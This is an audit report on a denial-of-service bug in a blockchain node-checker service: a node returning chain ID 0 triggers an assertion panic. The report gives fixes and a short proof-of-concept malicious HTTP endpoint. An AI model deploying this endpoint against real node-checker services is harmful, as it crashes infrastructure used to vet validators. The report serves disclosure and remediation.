# Audit Report

## Title
Unvalidated Chain ID Causes Panic in Node-Checker Service

## Summary
The Node-Checker's TPS checker and Noise provider fail to validate the `chain_id` field returned by the `ApiIndexProvider.provide()` method before passing it to `ChainId::new()`. A malicious target node can return `chain_id = 0`, causing the node-checker service to panic and crash due to an assertion failure.

## Finding Description
The node-checker service queries external nodes to validate their health and performance. When checking a target node, it retrieves chain information via the `ApiIndexProvider.provide()` method, which returns an `IndexResponse` containing a `chain_id` field of type `u8`. [1](#0-0) 

The `chain_id` value is passed directly to `ChainId::new()` without validation. The `ChainId::new()` function contains an assertion that panics if the chain ID is 0: [2](#0-1) 

Since the target node being checked is external and potentially untrusted, a malicious node operator can configure their node's API to return `chain_id: 0` in the `IndexResponse`. When the node-checker processes this response, the assertion in `ChainId::new()` will panic, crashing the service.

The same vulnerability exists in the `NoiseProvider`: [3](#0-2) 

**Attack Flow:**
1. Attacker sets up a malicious node with API endpoint returning `{"chain_id": 0, ...}` in IndexResponse
2. Node-checker service attempts to check the malicious node
3. `target_api_index_provider.provide().await` successfully returns the response
4. `ChainId::new(0)` is called, triggering the assertion
5. Service panics and crashes, requiring manual restart

## Impact Explanation
**Severity: High** - This qualifies as an "API crash" under the bug bounty criteria.

The node-checker service is a critical operational tool used to:
- Validate nodes before they join the network
- Monitor node health and performance
- Ensure nodes meet minimum TPS requirements

A crash of this service has several impacts:
- **Service Availability**: The node-checker becomes unavailable, preventing legitimate node validation
- **Operational Disruption**: Manual intervention required to restart the service
- **Potential for Persistent DoS**: If the malicious node is repeatedly queried (e.g., in automated checks), it could cause repeated crashes

While this does not directly affect consensus, transaction processing, or fund security, it impacts the operational infrastructure used to maintain network quality and validator onboarding.

## Likelihood Explanation
**Likelihood: High**

The attack is trivial to execute:
- **No authentication required**: The node-checker is designed to query arbitrary external nodes
- **Simple exploit**: Attacker only needs to return invalid JSON with `chain_id: 0`
- **No special privileges needed**: Any attacker can set up a fake node endpoint
- **Expected use case**: The node-checker is explicitly designed to query untrusted target nodes

The exploit complexity is minimal - a simple HTTP server returning:
```json
{"chain_id": 0, "epoch": "0", "ledger_version": "0", ...}
```

## Recommendation
Replace the panic-based validation with graceful error handling. Instead of calling `ChainId::new()` directly, validate the chain_id before constructing the ChainId object.

**Fixed code for tps.rs:**
```rust
let chain_id = match target_api_index_provider.provide().await {
    Ok(response) => {
        // Validate chain_id before calling ChainId::new()
        if response.chain_id == 0 {
            return Ok(vec![Self::build_result(
                "Invalid chain ID from your node".to_string(),
                0,
                "Your node returned chain ID 0, which is reserved and invalid. Please check your node configuration.".to_string(),
            )]);
        }
        ChainId::new(response.chain_id)
    },
    Err(err) => {
        return Ok(vec![Self::build_result(
            "Failed to get chain ID of your node".to_string(),
            0,
            format!("There was an error querying your node's API: {:#}", err),
        )]);
    },
};
```

**Fixed code for noise.rs:**
```rust
async fn provide(&self) -> Result<Self::Output, ProviderError> {
    let response = self.api_indexer_provider.provide().await?;
    if response.chain_id == 0 {
        return Err(ProviderError::ParseError(anyhow::anyhow!(
            "Invalid chain ID 0 returned from node"
        )));
    }
    Ok(NodeAddressArgs {
        address: self.network_address.clone(),
        chain_id: ChainId::new(response.chain_id),
    })
}
```

## Proof of Concept

**Setup a malicious node endpoint:**
```rust
use poem::{listener::TcpListener, Route, Server, handler};
use poem::web::Json;
use serde_json::json;

#[handler]
async fn malicious_index() -> Json<serde_json::Value> {
    Json(json!({
        "chain_id": 0,  // Invalid chain ID that will cause panic
        "epoch": "0",
        "ledger_version": "0",
        "oldest_ledger_version": "0",
        "ledger_timestamp": "0",
        "node_role": "full_node",
        "oldest_block_height": "0",
        "block_height": "0"
    }))
}

#[tokio::main]
async fn main() -> Result<(), std::io::Error> {
    let app = Route::new().at("/", poem::get(malicious_index));
    Server::new(TcpListener::bind("127.0.0.1:8080"))
        .run(app)
        .await
}
```

**Trigger the vulnerability:**
```bash
# Start the malicious endpoint on port 8080
cargo run --bin malicious_node

# In another terminal, configure node-checker to check the malicious node
# Point the target URL to http://127.0.0.1:8080
# The node-checker will panic when processing the response
```

**Expected result:** The node-checker service will panic with message: `"cannot have chain ID with 0"`

## Notes

This vulnerability affects two locations in the node-checker codebase:
1. `ecosystem/node-checker/src/checker/tps.rs` line 120
2. `ecosystem/node-checker/src/provider/noise.rs` line 77

Both should be patched to prevent the panic. The root cause is using `ChainId::new()` which uses `assert!()` for validation instead of returning a `Result` type. While this design decision makes sense for internal trusted code paths, it's inappropriate when processing data from untrusted external sources.

The `IndexResponse` type itself is correctly defined with `chain_id: u8`, but the consuming code assumes this value will always be valid. [4](#0-3)

### Citations

**File:** ecosystem/node-checker/src/checker/tps.rs (L119-120)
```rust
        let chain_id = match target_api_index_provider.provide().await {
            Ok(response) => ChainId::new(response.chain_id),
```

**File:** types/src/chain_id.rs (L183-186)
```rust
    pub fn new(id: u8) -> Self {
        assert!(id > 0, "cannot have chain ID with 0");
        Self(id)
    }
```

**File:** ecosystem/node-checker/src/provider/noise.rs (L77-77)
```rust
            chain_id: ChainId::new(self.api_indexer_provider.provide().await?.chain_id),
```

**File:** api/types/src/index.rs (L14-29)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, PoemObject, Serialize)]
pub struct IndexResponse {
    /// Chain ID of the current chain
    pub chain_id: u8,
    pub epoch: U64,
    pub ledger_version: U64,
    pub oldest_ledger_version: U64,
    pub ledger_timestamp: U64,
    pub node_role: RoleType,
    pub oldest_block_height: U64,
    pub block_height: U64,
    // This must be optional to be backwards compatible
    /// Git hash of the build of the API endpoint.  Can be used to determine the exact
    /// software version used by the API endpoint.
    pub git_hash: Option<String>,
}
```
